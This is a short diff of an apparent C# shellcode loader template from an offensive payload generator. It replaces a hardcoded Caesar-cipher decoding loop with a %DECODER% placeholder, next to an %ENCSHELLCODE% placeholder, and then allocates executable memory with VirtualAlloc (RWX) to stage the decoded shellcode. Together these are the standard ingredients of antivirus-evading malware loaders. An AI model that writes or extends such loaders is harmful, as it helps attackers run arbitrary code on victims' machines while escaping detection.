@@ -50,11 +50,12 @@ namespace ClassLibrary1
             %ENCSHELLCODE%
         
             //Decoding shellcode with Cesar Cipher
-            for(int i = 0; i < buf.Length; i++)
-            {
-                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
-            }
-                          
+            //for(int i = 0; i < buf.Length; i++)
+            //{
+            //    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+            //}
+
+            %DECODER%            
 
 			int size = buf.Length;
 			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
